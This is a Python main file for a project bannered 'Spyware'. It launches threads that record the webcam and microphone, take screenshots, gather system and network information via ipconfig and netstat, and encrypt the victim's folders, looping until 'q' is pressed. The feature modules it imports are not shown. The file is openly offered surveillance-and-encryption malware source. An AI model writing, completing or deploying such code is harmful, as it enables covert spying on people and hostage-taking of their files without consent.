import keyboard
import threading
from Features.CmdPrompts.CmdPrompts import CmdPrompts
from Features.Webcamera.Webcamera import Webcamera
from Features.Screenshot.Screenshot import Screenshot
from Features.Soundfile.Soundfile import Soundfile
from Features.SystemInformation.SystemInformation import SystemInformation
from Util.FileEncryption import FileEncryption


class MainFileException(Exception):
    pass


exit_program = False


def main():
    ascii_art = """
           _____                                    
          / ____|                                   
         | (___  _ __  _   ___      ____ _ _ __ ___ 
          \___ \| '_ \| | | \ \ /\ / / _` | '__/ _ \
          ____) | |_) | |_| |\ V  V / (_| | | |  __/
         |_____/| .__/ \__, | \_/\_/ \__,_|_|  \___|
                | |     __/ |                       
                |_|    |___/                                                    
        """

    print(ascii_art)

    try:
        # Create instances of the classes
        cmd_prompts = CmdPrompts()
        web_camera = Webcamera()
        screenshot = Screenshot()
        microphone = Soundfile()
        sys_info = SystemInformation()
        file_encryptor = FileEncryption()

        # Create threads for each feature
        threads = [
            threading.Thread(target=cmd_prompts.ipconfig_all),
            threading.Thread(target=cmd_prompts.netstat_ano),
            threading.Thread(target=web_camera.record_screen),
            threading.Thread(target=screenshot.screenshot),
            threading.Thread(target=microphone.audio_recording),
            threading.Thread(target=sys_info.system_information),
            threading.Thread(target=file_encryptor.encrypt_folders)
        ]

        # Start the threads
        for thread in threads:
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

    except Exception as error:
        raise MainFileException(f"Main failed to run") from error


if __name__ == '__main__':
    try:
        while not exit_program:
            main()

            if keyboard.is_pressed("q"):
                exit_program = True

    except MainFileException as e:
        print(f"Main failed to run: {str(e)}")
    finally:
        # Perform cleanup here if needed
        pass
